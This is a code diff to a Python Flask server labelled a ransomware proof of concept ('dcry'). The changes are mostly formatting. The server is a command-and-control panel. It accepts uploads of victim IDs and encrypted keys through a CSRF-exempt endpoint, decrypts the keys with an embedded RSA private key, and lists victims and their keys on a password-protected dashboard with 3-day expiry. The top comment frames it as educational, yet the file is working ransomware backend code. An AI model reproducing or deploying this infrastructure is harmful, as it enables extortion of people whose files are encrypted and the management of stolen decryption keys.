@@ -9,26 +9,19 @@
 # under supervision of cybersecurity professionals.
 # The authors assume no liability for any misuse or damage caused.
 
-import re
-import os
 import base64
+import os
+import re
 import shutil
 from datetime import datetime, timedelta
 
-from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
-from flask_wtf.csrf import CSRFProtect
+from Crypto.PublicKey import RSA
+from flask import (Flask, flash, jsonify, redirect, render_template_string,
+                   request, url_for)
 from flask_httpauth import HTTPBasicAuth
+from flask_wtf.csrf import CSRFProtect
 from markupsafe import escape as flask_escape
-from flask import (
-    Flask,
-    request,
-    render_template_string,
-    redirect,
-    url_for,
-    flash,
-    jsonify,
-)
 
 RSA_PRIVATE_KEY = """-----BEGIN RSA PRIVATE KEY-----
 MIIJJwIBAAKCAgEAnCK4qHp0Ie/ClNE4nUaNwa8L36BKek8FoA0+hkUsEFdl/85M
@@ -84,30 +77,34 @@ JuFhYChYqOk47EbQPBHRLaOlq2fLTsxPDZ3wje0DBsnLZ/2e2pHv2efaIA==
 
 app = Flask(__name__)
 auth = HTTPBasicAuth()
-users = {
-    "dcry_admin": "dcry-ransomware-poc" 
-}
+users = {"dcry_admin": "dcry-ransomware-poc"}
 app.config["SECRET_KEY"] = "dcry-ransomware-poc"
 csrf = CSRFProtect(app)
 
 VICTIM_FOLDER = os.path.abspath(os.path.expanduser("~/dcry_victims/"))
 os.makedirs(VICTIM_FOLDER, exist_ok=True)
 
+
 def decrypt_key(encrypted_key):
     private_key = RSA.import_key(RSA_PRIVATE_KEY)
     cipher_rsa = PKCS1_OAEP.new(private_key)
     return cipher_rsa.decrypt(encrypted_key)
 
+
 def sanitize_path_component(component):
-    if not component: return "_"
+    if not component:
+        return "_"
     component = re.sub(r"[^a-zA-Z0-9_-]", "_", component)
-    if component in [".", ".."]: return "_"
+    if component in [".", ".."]:
+        return "_"
     return component
+
 
 def is_safe_path(victim_id):
     base_dir = os.path.abspath(VICTIM_FOLDER)
     victim_path = os.path.join(base_dir, victim_id)
     return os.path.commonprefix([os.path.abspath(victim_path), base_dir]) == base_dir
+
 
 def victim_is_expired(date_str, days_valid=3):
     try:
@@ -115,6 +112,7 @@ def victim_is_expired(date_str, days_valid=3):
         return datetime.now() > infected_date + timedelta(days=days_valid)
     except Exception:
         return False
+
 
 def delete_victim(victim_id):
     path = os.path.join(VICTIM_FOLDER, victim_id)
@@ -128,23 +126,32 @@ def delete_victim(victim_id):
             return False
     return False
 
+
 def get_victims_data():
     victims_data = []
     try:
         for vid in os.listdir(VICTIM_FOLDER):
-            if not is_safe_path(vid): continue
+            if not is_safe_path(vid):
+                continue
 
             vid_safe = sanitize_path_component(vid)
-            if not vid_safe or vid_safe == "_": continue
+            if not vid_safe or vid_safe == "_":
+                continue
 
             folder = os.path.join(VICTIM_FOLDER, vid_safe)
             info_path = os.path.join(folder, "info.txt")
             key_path = os.path.join(folder, "key.txt")
 
-            if not os.path.isfile(info_path) or not os.path.isfile(key_path): continue
+            if not os.path.isfile(info_path) or not os.path.isfile(key_path):
+                continue
 
             try:
-                info = {k: v for line in open(info_path, "r") if "=" in line for k, v in [line.strip().split("=", 1)]}
+                info = {
+                    k: v
+                    for line in open(info_path, "r")
+                    if "=" in line
+                    for k, v in [line.strip().split("=", 1)]
+                }
 
                 if victim_is_expired(info.get("date", ""), 3):
                     delete_victim(vid_safe)
@@ -153,12 +160,14 @@ def get_victims_data():
                 with open(key_path, "r") as f:
                     key = f.read()
 
-                victims_data.append({
-                    "username": flask_escape(info.get("username", "")),
-                    "id": flask_escape(vid_safe),
-                    "date": flask_escape(info.get("date", "")),
-                    "key": flask_escape(key),
-                })
+                victims_data.append(
+                    {
+                        "username": flask_escape(info.get("username", "")),
+                        "id": flask_escape(vid_safe),
+                        "date": flask_escape(info.get("date", "")),
+                        "key": flask_escape(key),
+                    }
+                )
             except Exception as e:
                 app.logger.error(f"Error reading data for {vid_safe}: {e}")
                 continue
@@ -166,13 +175,14 @@ def get_victims_data():
         app.logger.error(f"Error listing victims: {e}")
     return victims_data
 
+
 @app.route("/delete_victim", methods=["POST"])
 def delete_victim_route():
     victim_ids = request.form.getlist("victim_ids")
     if not victim_ids:
         flash("No items were selected for deletion.", "warning")
         return redirect(url_for("dashboard"))
-    
+
     deleted_count, failed_count = 0, 0
     for victim_id in victim_ids:
         sanitized_id = sanitize_path_component(victim_id)
@@ -180,13 +190,18 @@ def delete_victim_route():
             app.logger.warning(f"Skipping invalid or unsafe victim ID: {victim_id}")
             failed_count += 1
             continue
-        if delete_victim(sanitized_id): deleted_count += 1
-        else: failed_count += 1
+        if delete_victim(sanitized_id):
+            deleted_count += 1
+        else:
+            failed_count += 1
 
-    if deleted_count > 0: flash(f"Successfully deleted {deleted_count} selected item(s).", "success")
-    if failed_count > 0: flash(f"Failed to delete {failed_count} item(s).", "danger")
-    
+    if deleted_count > 0:
+        flash(f"Successfully deleted {deleted_count} selected item(s).", "success")
+    if failed_count > 0:
+        flash(f"Failed to delete {failed_count} item(s).", "danger")
+
     return redirect(url_for("dashboard"))
+
 
 @app.route("/upload", methods=["POST"])
 @csrf.exempt
@@ -196,9 +211,11 @@ def upload():
     date = request.form.get("date", "")
     key = request.form.get("key", "")
     vid = sanitize_path_component(vid_raw)
-    if not vid or vid == "_": return "Invalid victim ID.", 400
-    if not is_safe_path(vid): return "Path Traversal attempt detected.", 400
-    
+    if not vid or vid == "_":
+        return "Invalid victim ID.", 400
+    if not is_safe_path(vid):
+        return "Path Traversal attempt detected.", 400
+
     folder = os.path.join(VICTIM_FOLDER, vid)
     os.makedirs(folder, exist_ok=True)
     with open(os.path.join(folder, "info.txt"), "w") as f:
@@ -212,19 +229,22 @@ def upload():
         return f"Key decryption failed: {e}", 400
     return "Upload success."
 
+
 @app.route("/dashboard-data")
 def dashboard_data():
     victims = get_victims_data()
     return jsonify(victims)
+
 
 @auth.verify_password
 def verify_password(username, password):
     if username in users and users[username] == password:
         return username
 
+
 @app.route("/dashboard")
 @auth.login_required
-def dashboard(): 
+def dashboard():
     victims_data = get_victims_data()
     html = """
 <!DOCTYPE html>
@@ -364,6 +384,7 @@ def dashboard():
 </html>
     """
     return render_template_string(html, victims=victims_data)
+
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
